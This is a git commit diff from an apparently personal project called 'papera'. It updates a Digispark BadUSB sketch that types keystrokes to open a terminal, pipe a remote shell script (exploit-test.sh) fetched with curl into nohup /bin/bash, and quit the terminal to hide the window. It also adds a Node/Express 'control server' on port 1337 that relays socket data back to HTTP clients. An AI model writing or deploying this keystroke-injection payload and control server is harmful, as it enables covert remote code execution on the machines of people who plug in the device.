24d3f51d4cd6dd7a371a81a7c794caaa86012403
Gianluca Venturini <gianluca.91@gmail.com>
2022-06-11 14:27:56 -0700

    Node control server

--- papera/papera.ino
+++ papera/papera.ino
@@ -5,7 +5,10 @@ void setup() {
   DigiKeyboard.print("terminal");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(2000);
-  DigiKeyboard.print("curl ");
+  DigiKeyboard.print("curl https://raw.githubusercontent.com/gianluca-venturini/papera/master/exploit-test.sh | nohup /bin/bash");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
---
+++ server.js
@@ -0,0 +1,39 @@
+const express = require('express');
+const fs = require('fs');
+const https = require('https');
+const http = require('http');
+const net = require('net');
+
+const options = {
+  // key: fs.readFileSync("./key.pem"),
+  // cert: fs.readFileSync("./cert.pem")
+};
+
+const app = express();
+
+app.listen(1337);
+
+app.get('/', (req, res) => {
+  // const fileName = req.socket.remoteAddress;
+  const fileName = '/tmp/test.sock';
+  try {
+    fs.unlinkSync(fileName); // delete socket in case it's still there
+  } catch (e) { }
+
+  var server = net.createServer(stream => {
+    stream.on('data', c => {
+      console.log('data:', c.toString());
+      res.write(c.toString());
+    });
+    stream.on('end', () => {
+      server.close();
+      res.end();
+    });
+  });
+
+  server.listen(fileName);
+});
+
+
+// https.createServer(options, app).listen(1337);
+http.createServer(options, app).listen(1337);
